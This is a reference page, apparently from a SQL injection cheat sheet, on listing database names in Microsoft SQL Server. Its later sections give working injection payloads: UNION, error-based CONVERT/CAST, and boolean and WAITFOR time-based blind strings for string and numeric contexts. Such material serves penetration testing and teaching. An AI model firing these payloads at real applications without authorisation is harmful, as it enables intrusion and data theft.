---
title: Database Names
description: How to retrieve database names from Microsoft SQL Server
category: Information Gathering
order: 5
tags: ["database enumeration", "information schema"]
lastUpdated: 2026-10-08
---

Extracting database names is often a crucial step in SQL injection attacks against Microsoft SQL Server. This information helps map the database landscape and identify potential targets for further exploitation.

## System Tables and Views with Database Information

| Source                 | Description                                        | Requires Privileges |
| ---------------------- | -------------------------------------------------- | ------------------- |
| `sys.databases`        | One row per database (SQL Server 2005+)            | Low                 |
| `master..sysdatabases` | SQL Server 2000 table, compatibility view in 2005+ | Low                 |
| `DB_NAME(n)`           | Name of the database with ID `n`                   | Low                 |

Every login can list all databases by default, because the `VIEW ANY DATABASE` permission is granted to `public`. If an administrator revokes it, a login only sees `master`, `tempdb`, the current database and the databases it owns (unless it has `CREATE DATABASE` or `ALTER ANY DATABASE`).

`information_schema.schemata` is not a list of databases: it returns the schemas of the current database, and its `catalog_name` column is always the current database name.

## Current Database Context

To get the name of the current database:

```sql
SELECT DB_NAME();
```

## List All Databases

### Using sys.databases (SQL Server 2005+)

```sql
-- Get all database names
SELECT name FROM sys.databases;

-- Get databases with additional details
SELECT name, database_id, create_date, compatibility_level
FROM sys.databases
ORDER BY name;
```

### Using Legacy System Tables (SQL Server 2000, still available as compatibility views)

```sql
-- Using master..sysdatabases
SELECT name FROM master..sysdatabases;

-- Using master.dbo.sysdatabases
SELECT name FROM master.dbo.sysdatabases;
```

## Filtering Database Results

```sql
-- Get user databases only (excluding system databases)
SELECT name FROM sys.databases
WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb');

-- Get databases created after a specific date
SELECT name, create_date FROM sys.databases
WHERE create_date > '2022-01-01';
```

## Advanced Techniques

### In Case of Limited Output

When you can only retrieve one value at a time, consider using string concatenation:

```sql
-- Concatenate database names into a single string
SELECT STRING_AGG(name, ',') FROM sys.databases;

-- STRING_AGG needs SQL Server 2017+; for 2005-2016 use FOR XML PATH
SELECT STUFF((
    SELECT ',' + name
    FROM sys.databases
    FOR XML PATH('')
), 1, 1, '');
```

### Using FOR XML PATH For Extraction

```sql
-- Get databases as XML: <db>master</db><db>tempdb</db>...
SELECT name AS 'db' FROM sys.databases FOR XML PATH('');
```

### Iterating with DB_NAME

`DB_NAME(n)` returns one name per request without needing `TOP` or `ORDER BY`: `DB_NAME(1)` is `master`, 2 `tempdb`, 3 `model`, 4 `msdb`, and user databases usually start at 5. It returns `NULL` for an ID that does not exist.

```sql
SELECT DB_NAME(5);
```

## Error-Based Extraction

Converting a string to `int` fails with an error that contains the string (`Conversion failed when converting the nvarchar value 'kbtest' to data type int.`), which leaks the value when the application shows database errors:

```sql
-- Error-based extraction using CONVERT
SELECT CONVERT(int, (SELECT TOP 1 name FROM sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb')));

-- Using CAST
SELECT CAST((SELECT TOP 1 name FROM sys.databases) AS int);
```

## Blind Extraction Techniques

For blind SQL injection (numeric context, e.g. `WHERE id = <input>`):

```sql
-- Check if the first character of the first database name is 'm' (ASCII 109)
1 AND ASCII(SUBSTRING(DB_NAME(1), 1, 1)) = 109--

-- Using time-based verification (stacked statement, see the Timing article)
1 IF ASCII(SUBSTRING(DB_NAME(1), 1, 1)) = 109 WAITFOR DELAY '0:0:5'--
```

## Practical Examples in Injection Context

String context (`WHERE username = '<input>'`); the UNION example assumes 3 columns, the second one a string:

```sql
-- Using UNION attack
' UNION SELECT NULL, name, NULL FROM sys.databases--

-- Error-based attack
' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.databases))--

-- Blind attack checking for 'master' database (needs a valid value before the quote)
admin' AND SUBSTRING((SELECT TOP 1 name FROM sys.databases ORDER BY name), 1, 6) = 'master'--
```

## Notes

1. Database names are visible to every login unless `VIEW ANY DATABASE` has been revoked from `public`.
2. The `master` database always exists and is a common first target.
3. The `sys.databases` view is available from SQL Server 2005 onwards.
4. `information_schema` views only describe the current database; use `sys.databases` or `DB_NAME()` to list databases.
5. Database names retrieved might be truncated if the output medium has character limitations.
